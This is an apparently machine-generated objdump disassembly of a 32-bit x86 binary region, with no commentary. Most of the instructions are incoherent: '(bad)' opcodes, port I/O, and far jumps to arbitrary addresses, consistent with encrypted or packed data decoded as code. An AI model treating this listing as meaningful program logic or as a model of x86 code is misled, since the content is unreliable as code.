  413223:	adc    eax,0x41
  413226:	inc    edi
  413227:	rcl    DWORD PTR [esi],1
  413229:	test   eax,0xdd05ff8e
  41322e:	push   esi
  41322f:	sbb    cl,ah
  413231:	inc    edi
  413232:	or     BYTE PTR [ecx-0xeb0d815],dl
  413238:	ja     0x4132a8
  41323a:	jle    0x41328a
  41323c:	cmc    
  41323d:	dec    ecx
  41323e:	in     al,dx
  41323f:	outs   dx,BYTE PTR cs:[esi]
  413241:	push   edi
  413242:	out    0x26,al
  413244:	ficomp DWORD PTR [ebx]
  413246:	test   DWORD PTR [ebx+0x7569383b],edi
  41324c:	fwait
  41324d:	and    eax,0x5af8357
  413252:	repz test al,0x6b
  413255:	inc    ecx
  413256:	push   eax
  413257:	loop   0x4132b1
  413259:	xchg   ecx,eax
  41325a:	fwait
  41325b:	xor    edx,DWORD PTR [eax-0x57]
  41325e:	lahf   
  41325f:	in     eax,dx
  413260:	ror    BYTE PTR [ecx+0x32052f23],cl
  413266:	and    DWORD PTR [ecx],0x10c279ff
  41326c:	ins    DWORD PTR es:[edi],dx
  41326d:	add    eax,0x548dfe7f
  413272:	rol    DWORD PTR [ebx],cl
  413274:	sub    al,0x7c
  413276:	xor    BYTE PTR [ecx+eax*8+0x158510b0],cl
  41327d:	enter  0x1119,0xd
  413281:	je     0x413249
  413283:	inc    ecx
  413284:	call   0x51f9:0x9a553252
  41328b:	outs   dx,BYTE PTR ds:[esi]
  41328c:	sub    al,0x69
  41328e:	mov    edx,0x68f07a42
  413293:	int3   
  413294:	test   BYTE PTR [ebp-0x78],cl
  413297:	imul   eax,DWORD PTR [esi+0x71],0xffffffca
  41329b:	out    0x19,al
  41329d:	inc    edx
  41329e:	jns    0x4132a7
  4132a0:	mov    eax,0x46845334
  4132a5:	adc    dl,BYTE PTR [ebp-0xde16f3]
  4132ab:	pop    ds
  4132ac:	pusha  
  4132ad:	std    
  4132ae:	addr16 sub eax,0xf911ac63
  4132b4:	loope  0x4132d4
  4132b6:	and    BYTE PTR [eax+0x32],ch
  4132b9:	cmp    al,0xd6
  4132bb:	jno    0x41333b
  4132bd:	dec    esp
  4132be:	inc    esi
  4132bf:	push   ecx
  4132c0:	das    
  4132c1:	mov    ecx,0x536106a6
  4132c6:	jbe    0x41327e
  4132c8:	les    ebp,FWORD PTR [edx-0x5c7acc8f]
  4132ce:	ja     0x41332a
  4132d0:	jae    0x413294
  4132d2:	xchg   edx,eax
  4132d3:	and    BYTE PTR [edx],cl
  4132d5:	leave  
  4132d6:	mov    bl,bl
  4132d8:	aad    0xa5
  4132da:	in     al,0x65
  4132dc:	test   eax,edi
  4132de:	xchg   ah,bl
  4132e0:	(bad)  
  4132e1:	aad    0xd
  4132e3:	dec    ecx
  4132e4:	mov    al,ds:0x1a6e2275
  4132e9:	fisttp DWORD PTR [ecx+0x31]
  4132ec:	mov    DWORD PTR [ebx-0x182ebecc],edi
  4132f2:	ret    
  4132f3:	cld    
  4132f4:	push   ss
  4132f5:	push   eax
  4132f6:	mov    esi,0x59e75e9
  4132fb:	dec    ecx
  4132fc:	mov    edi,0x692f574e
  413301:	jmp    0x9e2e17e4
  413306:	mov    BYTE PTR [esi+0x17c66cd3],bl
  41330c:	pop    es
  41330d:	fxch   st(6)
  41330f:	sub    ah,BYTE PTR [ebp+0x5b]
  413312:	je     0x4132e5
  413314:	xor    BYTE PTR [eax+0x70047c3a],bl
  41331a:	mov    bh,0xab
  41331c:	call   0x3c78d69b
  413321:	fadd   st(7),st
  413323:	pushf  
  413324:	scas   al,BYTE PTR es:[edi]
  413325:	xlat   BYTE PTR ds:[ebx]
  413326:	mov    ecx,DWORD PTR [ebp+0x66]
  413329:	(bad)  
  41332a:	clc    
  41332b:	jp     0x41337c
  41332d:	adc    BYTE PTR [eax-0x61],bh
  413330:	addr16 mov ch,0x18
  413333:	pop    eax
  413334:	call   FWORD PTR [ecx+0x188c7bde]
  41333a:	jmp    0x10bb:0x8310212a
  413341:	xor    eax,0x8c93e055
  413346:	(bad)  
  413347:	daa    
  413348:	xchg   DWORD PTR [ecx+0xd],edx
  41334b:	dec    eax
  41334c:	(bad)  
  41334d:	cmc    
  41334e:	int3   
  41334f:	pop    esi
  413350:	mov    ah,0x1e
  413352:	into   
  413353:	rcr    esp,1
  413355:	adc    BYTE PTR [esi+0x3216913c],dl
  41335b:	add    cl,BYTE PTR [ecx+ecx*1]
  41335e:	pop    ecx
  41335f:	adc    ecx,ebp
  413361:	mov    esi,0xf1b31e1e
  413366:	xchg   DWORD PTR [ebp+0x5cfc285f],esi
  41336c:	test   DWORD PTR [eax-0x5a],esp
  41336f:	add    BYTE PTR [edi-0x2a],cl
  413372:	(bad)  
  413373:	repnz push es
  413375:	mov    esp,0xacdef4bc
  41337a:	pop    esi
  41337b:	cmp    al,0xbb
  41337d:	(bad)  
  41337e:	sahf   
  41337f:	push   esi
  413380:	call   0x917bc04b
  413385:	push   0x24d5e341
  41338a:	xor    ecx,DWORD PTR [ebx+0x4aa2c330]
  413390:	lea    esi,[ebx]
  413392:	or     al,0x38
  413394:	adc    BYTE PTR es:[esp+eax*8+0x66],ch
  413399:	push   ecx
  41339a:	daa    
  41339b:	sbb    eax,0xbeed657c
  4133a0:	ds adc esp,eax
  4133a3:	or     eax,0x349df10e
  4133a8:	xor    ebx,ebx
  4133aa:	pop    edi
  4133ab:	xor    bl,bl
  4133ad:	test   al,0xa5
  4133af:	popa   
  4133b0:	mov    cl,0xa8
  4133b2:	cmp    edx,eax
  4133b4:	add    BYTE PTR [eax],bh
  4133b6:	xchg   BYTE PTR [eax+0x6a],al
  4133b9:	popa   
  4133ba:	adc    dl,BYTE PTR [esi]
  4133bc:	xor    eax,0xc6eb3b09
  4133c1:	jnp    0x413360
  4133c3:	xor    al,0x99
  4133c5:	sbb    bl,ah
  4133c7:	and    dh,BYTE PTR [edi]
  4133c9:	aas    
  4133ca:	scas   al,BYTE PTR es:[edi]
  4133cb:	cmp    eax,0xe831991d
  4133d0:	push   0xffffffb2
  4133d2:	pop    ss
  4133d3:	dec    ecx
  4133d4:	aad    0x31
  4133d6:	jns    0x413441
  4133d8:	mov    BYTE PTR [edx-0x71c17fd4],ch
  4133de:	adc    dl,dh
  4133e0:	(bad)  
  4133e1:	and    DWORD PTR [esp+ebx*2-0x51],esp
  4133e5:	fwait
  4133e6:	das    
  4133e7:	inc    edi
  4133e8:	fild   WORD PTR [edx+0x33]
  4133eb:	cmp    BYTE PTR [eax],bl
  4133ed:	mov    ebp,0xcc0510a2
  4133f2:	jl     0x4133a2
  4133f4:	adc    BYTE PTR [edx+0x5c],bh
  4133f7:	out    0x9b,eax
  4133f9:	adc    cl,BYTE PTR [edi]
  4133fb:	(bad)  
  4133fc:	in     eax,dx
  4133fd:	sub    ebp,0x56
  413400:	add    ch,BYTE PTR [edx-0x22]
  413403:	mov    ecx,0xca8fb8dd
  413408:	mov    ecx,0xc1a03eae
  41340d:	stos   BYTE PTR es:[edi],al
  41340e:	dec    ecx
  41340f:	loope  0x41348f
  413411:	nop
  413412:	sti    
  413413:	dec    edx
  413414:	mov    cl,0x8
  413416:	(bad)  
  413417:	pop    esp
  413418:	or     al,BYTE PTR [ebp-0x40f6e293]
  41341e:	ins    BYTE PTR es:[edi],dx
  41341f:	pop    ebp
  413420:	or     DWORD PTR [ecx+0x6f9a4df0],edx
  413426:	xor    al,0x95
  413428:	out    0xd2,eax
  41342a:	or     eax,DWORD PTR [ecx]
  41342c:	mov    al,0xef
  41342e:	jle    0x413443
  413430:	mov    BYTE PTR [eax+0x2],ah
  413433:	add    ecx,0xffffff84
  413436:	imul   esi,DWORD PTR [eax+ebx*2],0x42ee4565
  41343d:	pop    edx
  41343e:	push   es
  41343f:	pop    esp
  413440:	xor    eax,0x6c4bd0e7
  413445:	fs loopne 0x4134c6
  413448:	and    eax,0x93929734
  41344d:	adc    bl,BYTE PTR [ebx-0x34fc077d]
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x1f5db60f,al
  413492:	jb     0x413480
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xf670707e
  41349c:	test   al,0x3a
  41349e:	rol    DWORD PTR [edx+0x50],cl
  4134a1:	nop
  4134a2:	mov    dl,0xde
  4134a4:	push   edi
  4134a5:	fdivrp st(7),st
  4134a7:	ret    
  4134a8:	imul   eax,esi,0x38
  4134ab:	sbb    DWORD PTR [esi+0x73],esi
  4134ae:	and    BYTE PTR [eax+edx*1-0x21882405],bl
  4134b5:	std    
  4134b6:	in     eax,0x9
  4134b8:	pop    edi
  4134b9:	imul   ecx,DWORD PTR [edi+edi*1-0x6caab963],0x6c
  4134c1:	adc    DWORD PTR [edi],eax
  4134c3:	sbb    eax,0x1db4d1fa
  4134c8:	push   0x66
  4134ca:	sub    BYTE PTR [ebx],ch
  4134cc:	in     eax,0xc8
  4134ce:	aad    0x4b
  4134d0:	aam    0xa2
  4134d2:	jmp    0x6749:0xafbed318
  4134d9:	js     0x4134f9
  4134db:	(bad)  [edx]
  4134dd:	ins    DWORD PTR es:[edi],dx
  4134de:	xor    esi,DWORD PTR ds:0x35c10203
  4134e4:	cs into 
  4134e6:	cmp    eax,0xca7e265
  4134eb:	mov    bh,BYTE PTR [edx+eax*2-0x4b]
  4134ef:	inc    edx
  4134f0:	inc    DWORD PTR [ecx]
  4134f2:	or     BYTE PTR [ebx+0x4a],0xae
  4134f6:	mov    ch,0xd
  4134f8:	pop    ebx
  4134f9:	and    edi,DWORD PTR [edi]
  4134fb:	pop    esp
  4134fc:	ret    0xfda9
  4134ff:	sti    
  413500:	pop    esp
  413501:	les    ebx,FWORD PTR [esi]
  413503:	aaa    
  413504:	in     al,0xf
  413506:	and    al,BYTE PTR [eax+0x27]
  413509:	pop    esp
  41350a:	aam    0x61
  41350c:	out    0xdd,eax
  41350e:	mov    eax,ds:0x9f1ac8c1
  413513:	lea    edx,[edi-0xa]
  413516:	out    dx,eax
  413517:	jmp    0x302a96fb
  41351c:	xchg   DWORD PTR [ecx-0x3cc6bb48],ebx
  413522:	inc    eax
  413523:	mov    ds:0xb79c8737,eax
  413528:	jmp    0x413536
  41352a:	int    0xe9
  41352c:	repz jl 0x4134d2
  41352f:	hlt    
  413530:	xchg   ebp,eax
  413531:	mov    DWORD PTR [edi],esi
  413533:	repnz sbb BYTE PTR [edi+0x5c],dh
  413537:	pop    esi
  413538:	mov    ds:0xa2e8c142,al
  41353d:	ja     0x4134f7
  41353f:	add    al,al
  413541:	xor    bl,bh
  413543:	pop    ds
  413544:	ss sti 
  413546:	pop    esp
  413547:	cmp    DWORD PTR es:[ecx-0x1e632511],edx
  41354e:	imul   ecx,DWORD PTR [ebx],0xb7c42d7c
  413554:	loop   0x4134db
  413556:	(bad)  
  413557:	sub    eax,0x6dd3668
  41355c:	push   0xfffffff2
  41355e:	jge    0x4135be
  413560:	and    ch,bh
  413562:	retf   0x80ad
  413565:	inc    esi
  413566:	arpl   cx,bp
  413568:	cmp    cl,BYTE PTR [eax+0x6d]
  41356b:	aas    
  41356c:	repnz nop
  41356e:	xchg   ebp,eax
  41356f:	ror    DWORD PTR [ebp+ecx*1-0x36],1
  413573:	scas   eax,DWORD PTR es:[edi]
  413574:	repnz scas eax,DWORD PTR es:[edi]
  413576:	xchg   DWORD PTR [ebp+0x2a174ec8],ecx
  41357c:	and    al,al
  41357e:	jg     0x4135ce
  413580:	(bad)  
  413581:	adc    BYTE PTR [esi],dl
  413583:	xor    eax,0x92d006b9
  413588:	jmp    0x7ce8:0x714a4e8c
  41358f:	call   0x50dc1ae8
  413594:	push   eax
  413595:	mov    bh,0x2d
  413597:	xchg   esi,eax
  413598:	outs   dx,BYTE PTR ds:[esi]
  413599:	repnz mov ebp,0xdbd10d85
  41359f:	in     al,dx
  4135a0:	mov    eax,ds:0x4795f9c9
  4135a5:	out    dx,eax
  4135a6:	fst    DWORD PTR [edi+0x3e95dfb5]
  4135ac:	xor    eax,0xf309af0e
  4135b1:	scas   eax,DWORD PTR es:[edi]
  4135b2:	sub    al,0x9d
  4135b4:	mov    ds:0x91526b50,al
  4135b9:	rcr    DWORD PTR [esi+0x8],0xa
  4135bd:	inc    esp
  4135be:	out    0x1b,eax
  4135c0:	push   ebp
  4135c1:	mov    al,0x9c
  4135c3:	loop   0x413546
  4135c5:	jb     0x4135cf
  4135c7:	lods   eax,DWORD PTR ds:[esi]
  4135c8:	mov    ecx,0x7a4a658c
  4135cd:	mov    cl,0xce
  4135cf:	add    DWORD PTR [esi-0x2d23b70],esp
  4135d5:	mul    DWORD PTR [edi-0x283255e7]
  4135db:	or     ch,BYTE PTR [ecx-0x2c]
  4135de:	in     eax,dx
  4135df:	cmc    
  4135e0:	mov    ch,0xce
  4135e2:	pop    ecx
  4135e3:	repz pushf 
  4135e5:	dec    ecx
  4135e6:	jnp    0x4135f3
  4135e8:	hlt    
  4135e9:	dec    edx
  4135ea:	mov    cl,BYTE PTR [esi]
  4135ec:	jl     0x4135c9
  4135ee:	fcmovnbe st,st(0)
  4135f0:	jmp    0x2bfb:0x370307a1
  4135f7:	jbe    0x4135e1
  4135f9:	mov    ecx,0x45f073a0
  4135fe:	test   al,0xf5
  413600:	loopne 0x413629
  413602:	cmp    dh,ch
  413604:	inc    ebp
  413605:	lods   eax,DWORD PTR ds:[esi]
  413606:	xor    al,0xf6
  413608:	sti    
  413609:	inc    edi
  41360a:	or     DWORD PTR [ebp-0x240ddc4c],esp
  413610:	xchg   esi,eax
  413611:	adc    BYTE PTR ds:[edi+0x5db22c4f],0x4b
  413619:	jns    0x41365b
  41361b:	or     BYTE PTR [eax-0x41],al
  41361e:	mov    ebx,0x47ea58
  413623:	jmp    0x7a770bd2
  413628:	sti    
  413629:	jg     0x413669
  41362b:	inc    BYTE PTR [edx]
  41362d:	mov    es,esp
  41362f:	(bad)  
  413630:	mov    edx,0x1e3416c7
  413635:	aas    
  413636:	push   ds
  413637:	jnp    0x4135d8
  413639:	idiv   al
  41363b:	rcr    DWORD PTR [edx+0x6736c407],1
  413641:	xchg   edi,eax
  413642:	int    0xd9
  413644:	clc    
  413645:	fist   DWORD PTR [ebx-0x3c]
  413648:	pop    esi
  413649:	fs and esi,ebp
  41364c:	cmp    DWORD PTR [ecx-0xe],ebx
  41364f:	repz push eax
  413651:	and    DWORD PTR [ebx+0xbe9ff09],edi
  413657:	popa   
  413658:	sub    al,0x29
  41365a:	cdq    
  41365b:	fwait
  41365c:	rol    ecx,1
  41365e:	jp     0x413699
  413660:	aaa    
  413661:	pop    ebx
  413662:	mov    ebx,0xd2bfbdd6
  413667:	add    dh,BYTE PTR [esi]
  413669:	ins    BYTE PTR es:[edi],dx
  41366a:	iret   
  41366b:	and    eax,DWORD PTR [esi+0xfc56c70]
  413671:	lea    edi,[ebx+edx*8+0x1233f36f]
  413678:	sub    dl,BYTE PTR [eax+ebx*2-0x2d]
  41367c:	push   edx
  41367d:	and    al,0xa5
  41367f:	adc    bh,BYTE PTR [ebp-0x5]
  413682:	(bad)  
  413683:	dec    eax
  413684:	jb     0x413677
  413686:	aad    0xa0
  413688:	push   esp
  413689:	int3   
  41368a:	jge    0x4136f9
  41368c:	dec    eax
  41368d:	jo     0x413656
  41368f:	cmp    al,dh
  413691:	ror    BYTE PTR [edx+0x6a],1
  413694:	or     eax,0xc181c397
  413699:	cmp    BYTE PTR [edi],ch
  41369b:	fcomp  QWORD PTR [esi+0x19]
  41369e:	push   0xffffff90
  4136a0:	mov    edi,0x3288b655
  4136a5:	push   0xffffffc9
  4136a7:	or     eax,DWORD PTR cs:[esi+ebp*2+0x70]
  4136ac:	loopne 0x4136db
  4136ae:	loopne 0x4136b3
  4136b0:	dec    edi
  4136b1:	out    0x26,al
  4136b3:	ret    
  4136b4:	fadd   QWORD PTR [eax]
  4136b6:	adc    BYTE PTR [esi-0x1bb618ed],bh
  4136bc:	or     bl,ch
  4136be:	aam    0xed
  4136c0:	xor    BYTE PTR [edx-0x6b],0x71
  4136c4:	add    cl,BYTE PTR [esi-0x6b]
  4136c7:	inc    edi
  4136c8:	ret    0x89ed
  4136cb:	jnp    0x413731
  4136cd:	lock outs dx,BYTE PTR ds:[esi]
  4136cf:	iret   
  4136d0:	push   eax
  4136d1:	xor    bh,dl
  4136d3:	aad    0x75
  4136d5:	xchg   edi,eax
  4136d6:	push   es
  4136d7:	mov    BYTE PTR [ebx-0x78d8cf01],ch
  4136dd:	cmc    
  4136de:	add    esp,DWORD PTR [ebp-0x24d1b1eb]
  4136e4:	mov    cl,BYTE PTR [ecx]
  4136e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136e7:	pop    ebx
  4136e8:	cmp    ebx,DWORD PTR [eax]
  4136ea:	inc    ebx
  4136eb:	out    0x22,al
  4136ed:	out    dx,eax
  4136ee:	mov    eax,ds:0xde8464c
  4136f3:	xor    edx,DWORD PTR [edi-0x41301801]
  4136f9:	out    0xa9,al
  4136fb:	loope  0x4136ea
  4136fd:	data16 stc 
  4136ff:	jmp    0xfef3:0x7d0337c9
  413706:	and    bh,dl
  413708:	cs in  eax,dx
  41370a:	jmp    0x619ce01b
  41370f:	push   ebx
  413710:	mov    al,0xc
  413712:	fsubr  DWORD PTR [edx]
  413714:	xor    eax,0x60eef61b
  413719:	sub    ah,dh
  41371b:	shr    bl,1
  41371d:	cwde   
  41371e:	(bad)  [ecx-0x31]
  413721:	mov    bh,cl
  413723:	inc    ebp
  413724:	dec    eax
  413725:	test   BYTE PTR [eax],dh
  413727:	add    al,0xb4
  413729:	lahf   
  41372a:	dec    ebx
  41372b:	cmp    al,BYTE PTR [edi]
  41372d:	call   0x763d:0x42fc86de
  413734:	test   eax,0xec16985e
  413739:	stos   DWORD PTR es:[edi],eax
  41373a:	in     al,0x8d
  41373c:	push   es
  41373d:	pop    ds
  41373e:	lahf   
  41373f:	(bad)  
  413740:	xchg   ecx,eax
  413741:	arpl   WORD PTR [eax+0x5ca50e80],bx
  413747:	sbb    dh,BYTE PTR [esi]
  413749:	lock mov BYTE PTR [eax-0x6feebddb],ch
  413750:	aad    0x1b
  413752:	or     al,0xe9
  413754:	es pop es
  413756:	call   0x47a1:0xb7c00e40
  41375d:	push   ss
  41375e:	je     0x413730
  413760:	and    eax,0xff83b4b
  413765:	test   DWORD PTR [ebp-0xfffff6],eax
  41376b:	jne    0x413775
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	ins    BYTE PTR es:[edi],dx
  41377f:	outs   dx,BYTE PTR ds:[esi]
  413780:	push   0x706b3533
  413785:	jo     0x413740
  413787:	jle    0x4137f9
  413789:	jo     0x4137a1
  41378b:	push   0x808ad073
  413790:	test   esi,esi
  413792:	push   edi
  413793:	pop    esp
  413794:	xchg   DWORD PTR [esi],ebp
  413796:	iret   
  413797:	leave  
  413798:	lahf   
  413799:	cmp    al,0xa
  41379b:	ds int 0x1e
  41379e:	aaa    
  41379f:	push   cs
  4137a0:	jo     0x41379a
  4137a2:	jmp    0x4137d0
  4137a4:	ins    BYTE PTR es:[edi],dx
  4137a5:	push   eax
  4137a6:	fneni(8087 only) 
  4137a8:	ret    
  4137a9:	test   esi,esi
  4137ab:	dec    ebp
  4137ac:	fnstsw WORD PTR [ebx+0xd]
  4137af:	mov    ds:0x2d5daa11,eax
  4137b4:	jae    0x41380e
  4137b6:	jle    0x413802
  4137b8:	pop    esp
  4137b9:	xor    ch,cl
  4137bb:	mov    DWORD PTR [ecx+0x79],ecx
  4137be:	lods   al,BYTE PTR ds:[esi]
  4137bf:	or     bl,ch
  4137c1:	cs and eax,0x1b73587
  4137c7:	retf   0x92e0
  4137ca:	shl    BYTE PTR [ecx],cl
  4137cc:	fdiv   DWORD PTR [esi-0x20]
  4137cf:	pop    ds
  4137d0:	sbb    al,0xa4
  4137d2:	retf   
  4137d3:	push   0x405ea819
  4137d8:	cmp    al,BYTE PTR [ebx+0x23]
  4137db:	cld    
  4137dc:	jmp    0xa2734807
  4137e1:	jl     0x413825
  4137e3:	mov    eax,edx
  4137e5:	test   al,0xa4
  4137e7:	mov    bh,0x97
  4137e9:	lahf   
  4137ea:	sar    bh,1
  4137ec:	div    BYTE PTR [ecx]
  4137ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ef:	loopne 0x4137d8
  4137f1:	in     eax,0xc7
  4137f3:	rcr    DWORD PTR [ebx+edx*8-0x2096ced],cl
  4137fa:	xor    eax,0xa0b4d85f
  4137ff:	outs   dx,BYTE PTR ds:[esi]
  413800:	mov    bl,0xdd
  413802:	(bad)  
  413804:	shl    DWORD PTR [bp+di+0x2550],1
  413809:	cs jle 0x4137ec
  41380c:	in     al,0x82
  41380e:	mov    eax,ds:0xbdf79775
  413813:	fwait
  413814:	in     eax,0xac
  413816:	mov    dh,BYTE PTR [eax-0x25fbef79]
  41381c:	mov    al,ds:0x7ee508
  413821:	add    DWORD PTR [ebx-0x31],esi
  413824:	aaa    
  413825:	pop    esp
  413826:	rol    eax,0xbb
  413829:	fwait
  41382a:	cdq    
  41382b:	cli    
  41382c:	push   cs
  41382d:	aam    0x77
  41382f:	sar    DWORD PTR [ecx-0x39],cl
  413832:	xor    al,0xa2
  413834:	push   0xe8749acc
  413839:	jb     0x413853
  41383b:	sar    al,0x1f
  41383e:	xor    ecx,DWORD PTR [esi-0x9]
  413841:	jb     0x413816
  413843:	daa    
  413844:	mov    al,ds:0x9a4d4a4f
  413849:	cmp    al,0x3c
  41384c:	push   edi
  41384d:	push   edi
  41384e:	push   cs
  41384f:	or     al,0xad
  413851:	sar    BYTE PTR [esi-0x4b],1
  413854:	mov    bl,0xda
  413856:	inc    esp
  413857:	or     eax,0x26fe5db0
  41385c:	test   bh,cl
  41385e:	mov    DWORD PTR [ebx+edi*1-0x6e],edx
  413862:	out    dx,eax
  413863:	sar    BYTE PTR [esi],cl
  413865:	add    esp,DWORD PTR [esi-0x2]
  413868:	es int 0xbf
  41386b:	test   eax,0xe24f15b
  413870:	pop    es
  413871:	mov    ch,0x3b
  413873:	pop    ds
  413874:	aad    0xbb
  413876:	adc    al,0x4e
  413878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413879:	or     DWORD PTR [ebp-0x7c515484],0x86286ecb
  413883:	jnp    0x413882
  413885:	add    esi,DWORD PTR [ecx-0x167a0113]
  41388b:	out    dx,al
  41388c:	push   edi
  41388d:	push   esi
  41388e:	aad    0x54
  413890:	mov    DWORD PTR [ebx-0x6a],ebx
  413893:	push   ds
  413894:	(bad)  
  413895:	scas   al,BYTE PTR es:[edi]
  413896:	mov    esp,0xa93f4484
  41389b:	rcr    BYTE PTR [edi+0x31228564],0xd3
  4138a2:	daa    
  4138a3:	lock push 0x68fd20cd
  4138a9:	add    al,0x1e
  4138ab:	push   ss
  4138ac:	xor    eax,0xb52f474a
  4138b1:	mov    ch,0x3d
  4138b3:	ss jmp 0x413882
  4138b6:	retf   0xad4
  4138b9:	mov    dh,0xe1
  4138bb:	mov    eax,ds:0xd6d42cf0
  4138c0:	(bad)  
  4138c1:	push   ebp
  4138c2:	fnstenv [ebx]
  4138c4:	rcr    BYTE PTR [ecx-0x73],1
  4138c7:	jp     0x413878
  4138c9:	(bad)
  4138cc:	mov    esi,0xbb4cdd09
  4138d1:	cmp    eax,0xb9c62c6a
  4138d6:	cwde   
  4138d7:	aam    0x5e
  4138d9:	mov    dl,0xc
  4138db:	mov    eax,0xf800190c
  4138e0:	push   0x7f
  4138e2:	mov    esp,0xb795e2f6
  4138e7:	lahf   
  4138e8:	(bad)  
  4138e9:	out    dx,al
  4138ea:	and    ebx,DWORD PTR ds:0xeb214c22
  4138f1:	pop    edi
  4138f2:	adc    dh,BYTE PTR [ebx+0x4837d04d]
  4138f8:	add    al,0x22
  4138fa:	fadd   DWORD PTR [edi-0x7a48cefa]
  413900:	or     BYTE PTR [ebx],dl
  413902:	pop    ecx
  413903:	lock ja 0x4138e8
  413906:	adc    eax,DWORD PTR [ebx]
  413908:	les    ecx,FWORD PTR [ebp-0x2a]
  41390b:	sub    al,0x32
  41390d:	sbb    dh,dl
  41390f:	adc    bh,dh
  413911:	xchg   ebx,eax
  413912:	(bad)  
  413913:	jecxz  0x413952
  413915:	mov    al,ds:0x13e5dfbc
  41391a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391b:	call   0x3484f36c
  413920:	or     eax,0xf1635396
  413925:	div    DWORD PTR [ecx-0x4b36b23c]
  41392b:	adc    eax,0xc8bb4f4b
  413930:	sbb    BYTE PTR [edx+0x1f916ccf],dh
  413936:	fdiv   QWORD PTR [edi+eax*2]
  413939:	mov    bh,0x12
  41393b:	retf   0xf3a0
  41393e:	jmp    0x44367388
  413943:	xlat   BYTE PTR ds:[ebx]
  413944:	cld    
  413945:	and    BYTE PTR [eax],cl
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	jp     0x4139b3
  41394a:	sub    BYTE PTR ds:0x2bf516f7,al
  413950:	jle    0x413990
  413952:	mov    al,0x22
  413954:	ret    
  413955:	xor    ebp,0xffffffb8
  413958:	inc    eax
  413959:	jno    0x4138f8
  41395b:	adc    eax,0xa952d9ba
  413960:	push   edi
  413961:	dec    eax
  413962:	(bad)  
  413963:	add    DWORD PTR ds:0x36e24525,ebp
  413969:	sbb    BYTE PTR [edi+0x11],dh
  41396c:	leave  
  41396d:	sti    
  41396e:	test   al,0xfd
  413970:	cmc    
  413971:	nop
  413972:	mov    ecx,0xf91cdd7f
  413977:	add    BYTE PTR [ebp+0x3088ff26],0x1a
  41397e:	stos   DWORD PTR es:[edi],eax
  41397f:	lea    esi,[ecx-0x54]
  413982:	loope  0x41394c
  413984:	push   ebp
  413985:	out    0x9f,eax
  413987:	xchg   ebp,eax
  413988:	push   esp
  41398a:	jo     0x4139c9
  41398c:	add    dh,dh
  41398e:	inc    esi
  41398f:	pop    ss
  413990:	(bad)  
  413991:	mov    ebp,0xf16cb5cb
  413996:	mov    bl,0x34
  413998:	add    eax,0xa5596b2f
  41399d:	jbe    0x413960
  41399f:	push   eax
  4139a0:	dec    BYTE PTR [edi+eax*4]
  4139a3:	xor    eax,DWORD PTR [ebp-0x44dc936]
  4139a9:	inc    esi
  4139aa:	mov    edx,0xf401927c
  4139af:	mov    al,ds:0xe675370b
  4139b4:	dec    edx
  4139b5:	aad    0x34
  4139b7:	ret    
  4139b8:	cmp    al,0x86
  4139ba:	mov    edx,ebx
  4139bc:	imul   edx,DWORD PTR [esi],0x97e59cea
  4139c2:	dec    ebx
  4139c3:	out    dx,al
  4139c4:	arpl   bx,bp
  4139c6:	pop    esi
  4139c7:	pushf  
  4139c8:	xor    bl,BYTE PTR [ebx]
  4139ca:	or     al,0x97
  4139cc:	add    BYTE PTR [eax],dl
  4139ce:	int3   
  4139cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139d0:	push   es
  4139d1:	sbb    di,WORD PTR [ebp+0x52]
  4139d5:	mov    ebx,0xd8b4df51
  4139da:	pop    eax
  4139db:	data16 mov ch,0x3a
  4139de:	mul    bl
  4139e0:	add    eax,0x3bdf2ed6
  4139e5:	push   ebx
  4139e6:	shl    DWORD PTR [ebp-0x3e],0xf8
  4139ea:	xor    DWORD PTR [ebp+0x45cc0985],eax
  4139f0:	jge    0x413a0a
  4139f2:	hlt    
  4139f3:	xor    eax,ecx
  4139f5:	int    0x73
  4139f7:	jecxz  0x413a64
  4139f9:	pop    edi
  4139fa:	dec    eax
  4139fb:	popf   
  4139fc:	out    dx,al
  4139fd:	aaa    
  4139fe:	inc    eax
  4139ff:	mov    bh,BYTE PTR [eax-0x44]
  413a02:	jno    0x413a3b
  413a04:	int    0x3d
  413a06:	sbb    esi,esi
  413a08:	ins    BYTE PTR es:[edi],dx
  413a09:	rol    BYTE PTR [esi-0x5aabeb5e],cl
  413a0f:	ret    
  413a10:	mov    ds:0xc003ba0e,al
  413a15:	(bad)  
  413a16:	stos   DWORD PTR es:[edi],eax
  413a17:	(bad)  
  413a19:	inc    eax
  413a1a:	loop   0x4139a9
  413a1c:	push   0x3d0c713a
  413a21:	add    al,ch
  413a23:	cdq    
  413a24:	and    DWORD PTR [ebp+0x5c5f8829],ebx
  413a2a:	in     al,dx
  413a2b:	adc    DWORD PTR [edi+ebx*2+0x6c894d26],ecx
  413a32:	lahf   
  413a33:	pop    ecx
  413a34:	sub    BYTE PTR [eax-0x71c2498e],ah
  413a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3b:	jmp    0x8bb5d1e4
  413a40:	mov    di,0x2006
  413a44:	jnp    0x413a25
  413a46:	shl    DWORD PTR [eax],1
  413a48:	mov    al,BYTE PTR [ebp-0x7c]
  413a4b:	mov    ds:0x83390f06,eax
  413a50:	popa   
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
